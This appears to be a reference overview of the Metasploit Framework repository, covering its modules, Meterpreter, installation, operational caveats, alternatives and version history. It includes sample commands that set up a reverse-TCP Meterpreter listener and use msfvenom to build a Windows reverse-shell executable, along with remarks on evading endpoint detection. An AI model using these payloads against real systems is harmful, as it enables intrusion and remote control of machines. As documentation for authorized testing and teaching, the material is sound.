# rapid7/metasploit-framework

> The de facto open-source penetration-testing framework: a Ruby engine plus thousands of exploit, payload, and post-exploitation modules driven from `msfconsole`.

[GitHub repo](https://github.com/rapid7/metasploit-framework) ·
[Official website](https://www.metasploit.com/) ·
License: BSD-3-Clause (custom Metasploit Framework License; GitHub reports NOASSERTION)[^1]

## Overview

Metasploit Framework is an offensive-security toolkit organized around interchangeable modules: exploits, payloads, auxiliary scanners, encoders, NOP generators, evasion modules, and post-exploitation modules[^2]. It started as HD Moore's Perl project in 2003, was rewritten in Ruby for the 3.0 line in 2007, and has been maintained by Rapid7 since the 2009 acquisition[^3]. The Framework itself stays open source; Rapid7 also sells a commercial GUI product (Metasploit Pro) that shares the same module ecosystem. As of 2026 it is the most widely taught and most widely mirrored exploitation framework, and the reference format that most public exploit code is packaged against.

The defining property is **modularity through mixins**. An exploit is a Ruby class that inherits from `Msf::Exploit::Remote` and mixes in protocol helpers (`Msf::Exploit::Remote::Tcp`, `::HttpClient`, `::SMB::Client`, etc.); the framework supplies targeting, payload selection, encoding, and session handling for free. This is why a working exploit can be a few dozen lines, and why the module count (thousands of exploits and payloads) grows faster than the core. The cost is heavy coupling: modules depend on framework mixin internals, so the framework and its module tree ship and version together in one monorepo rather than as independent packages.

The other defining component is **Meterpreter**, an in-memory payload that runs without touching disk, loads extensions reflectively over an encrypted channel, and exposes a scripting API (process migration, `railgun` for arbitrary Win32 calls, port forwarding, file transfer). Meterpreter is what separates Metasploit from a bare exploit collection: the payload is a post-exploitation platform, not just a shell.

## Getting Started

The supported install path is the Rapid7 nightly installer (Linux/macOS); Metasploit also ships pre-installed on Kali Linux[^4].

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall > msfinstall
chmod +x msfinstall && ./msfinstall
```

A typical `msfconsole` session — set up a listener and catch a session:

```
msf6 > db_status                       # confirm PostgreSQL backend is connected
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.0.0.5
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run
```

Generate a standalone payload with `msfvenom` (the merged replacement for the old `msfpayload` + `msfencode`)[^5]:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.0.0.5 LPORT=4444 -f exe -o payload.exe
```

## Architecture / How It Works

The codebase splits into a small core and a large module tree:

- **`lib/msf/core`** — the framework object model: `Msf::Exploit`, `Msf::Payload`, `Msf::Auxiliary`, `Msf::Post`, the datastore (typed options like `LHOST`/`RHOST`), session management, and the mixin library that modules inherit protocol behavior from.
- **`lib/rex`** — the Ruby Extension Library: sockets, protocol parsers (SMB, HTTP, DCERPC, SSL), encoders, and the assembly/encoding primitives. Rex is the layer that lets a module speak a protocol without reimplementing it.
- **`modules/`** — the exploits, payloads, encoders, nops, auxiliary, post, and evasion modules. Each is a self-contained Ruby class discovered at load time by directory convention.
- **`msfconsole` / `msfvenom` / `msfdb`** — the interactive console, the standalone payload generator, and the database bootstrapper.

**Payloads are staged or stageless.** A staged payload (written `.../meterpreter/reverse_tcp`) sends a tiny first-stage stub that pulls the real payload over the connection; a stageless payload (`.../meterpreter_reverse_tcp`) is self-contained but larger. Staging keeps the initial exploit small at the cost of a second network round trip.

**Exploit ranking** communicates reliability. Each module declares a `Rank` from `ManualRanking` up through `ExcellentRanking`; the console uses it to warn when a module may crash the target. This is honest metadata, not marketing — many real-world modules are `AverageRanking` or `NormalRanking` and can leave a service dead.

**Database backend.** With PostgreSQL connected, `msfconsole` records hosts, services, credentials, and loot, so multi-host engagements and `db_nmap` imports are queryable. The database is optional but most workflows assume it.

**External modules and automation.** Since 5.0 modules can be written in Python or Go (executed as external processes over a JSON protocol), and the framework exposes a JSON-RPC / MSGRPC API for driving it programmatically or from Metasploit Pro[^6].

## Production Notes

**This is an offensive tool; treat it as one.** Running Metasploit against systems you are not explicitly authorized to test is illegal in most jurisdictions. Every operational note below assumes a sanctioned engagement.

- **Encoders are not AV evasion.** The classic `shikata_ga_nai` polymorphic encoder was designed to survive bad-char filtering, not to defeat antivirus. Modern EDR/AV flag stock Metasploit payloads on signature within seconds; the `-e` encoder flags and iteration counts do not meaningfully change that. Real evasion requires custom loaders, and the framework's own artifacts (default Meterpreter, `msfvenom` templates) are among the most heavily signatured binaries in existence.
- **Default listeners and payloads are fingerprinted.** Meterpreter's staging behavior, default certificate, and handler responses are detectable by network defenders. Blue-team tooling ships Metasploit-specific signatures.
- **Module reliability varies wildly.** A memory-corruption exploit rated below `Great` can crash the target service or the whole host. Check `Rank`, read the module source, and test in a lab before touching production-adjacent targets.
- **Database setup is a common first-run failure.** `msfconsole` works without PostgreSQL but silently loses host/loot tracking; `msfdb init` and a running `postgresql` service are prerequisites for the full workflow.
- **The tree is large and moves fast.** With framework and modules in one monorepo on a rolling `master` (no pinned "release" most operators track), you effectively run a nightly. Pin a commit for reproducible engagements; a `git pull` can change module behavior or remove a module mid-assessment.
- **Ruby version coupling.** The framework tracks specific Ruby versions via `bundler`; manual (non-installer, non-Kali) setups regularly break on Ruby/gem mismatches. The nightly installer bundles a known-good Ruby for a reason.

## When to Use / When Not

**Use when:**
- You need a broad, maintained library of exploits and post-exploitation tooling in one place for authorized penetration testing or red-team training.
- You want Meterpreter's post-exploitation surface (pivoting, `railgun`, migration) without building a C2 from scratch.
- You're learning offensive security — it is the standard teaching platform with the deepest public documentation.
- You need to validate that a known CVE is exploitable in your environment and a module already exists.

**Avoid when:**
- You need stealth against modern EDR — its artifacts are the most-signatured in the field; reach for a purpose-built C2.
- You only need reconnaissance or scanning — a dedicated scanner is lighter and less likely to be flagged.
- You have no written authorization — running it is a legal problem, not a technical one.
- You want a stable, versioned dependency — the rolling monorepo is not designed to be vendored as a library.

## Alternatives

- bishopfox/sliver — open-source Go C2 framework; use instead when you need stealthier, less-signatured implants and modern adversary emulation over Meterpreter.
- fortra/impacket — Python classes for SMB/Kerberos/DCERPC; use instead when you need scriptable Active Directory and Windows protocol attacks rather than a module framework.
- nmap/nmap — network discovery and scanning; use instead (or alongside) when the task is recon and service enumeration, not exploitation.
- BC-SECURITY/Empire — PowerShell/Python post-exploitation C2; use instead when the engagement is Windows-centric and agent-management-focused.
- Cobalt Strike (commercial, Fortra) — the industry-standard paid red-team C2; use instead when you need mature team-server collaboration and Malleable C2 profiles and can pay for it.

## History

| Version | Date | Notes |
|---------|------|-------|
| 1.0 | 2003 | HD Moore's original release, written in Perl[^3]. |
| 2.0 | 2004 | Expanded module system, still Perl. |
| 3.0 | 2007 | Full rewrite in Ruby; the modern architecture[^3]. |
| — | 2009-10 | Rapid7 acquires the project[^3]. |
| 4.0 | 2011-08 | Post-acquisition modernization; repo history on GitHub begins. |
| — | 2015 | `msfvenom` replaces `msfpayload` + `msfencode`[^5]. |
| 5.0 | 2019-01 | Evasion modules, external Python/Go modules, JSON-RPC, database-as-a-service[^6]. |
| 6.0 | 2020-08 | End-to-end encrypted Meterpreter, SMBv3 client[^7]. |
| 6.x | ongoing | Rolling `master`; nightly installers, `msf6` console. |

## References

[^1]: Metasploit Framework `COPYING` / license (BSD-style custom license). https://github.com/rapid7/metasploit-framework/blob/master/COPYING
[^2]: Metasploit documentation — module types and usage. https://docs.metasploit.com/
[^3]: Rapid7, "Metasploit" history and acquisition background. https://www.rapid7.com/products/metasploit/
[^4]: Nightly installers documentation. https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html
[^5]: Rapid7 blog, "msfvenom replacement of msfpayload and msfencode." https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html
[^6]: Rapid7 blog, "Metasploit Framework 5.0 released." https://www.rapid7.com/blog/post/2019/01/10/metasploit-framework-5-0-released/
[^7]: Rapid7 blog, "Metasploit Framework 6.0." https://www.rapid7.com/blog/post/2020/08/06/whats-new-in-metasploit-6/

## Tags

ruby, penetration-testing, security, exploitation, red-team, offensive-security, meterpreter, payloads, post-exploitation, cybersecurity, cli
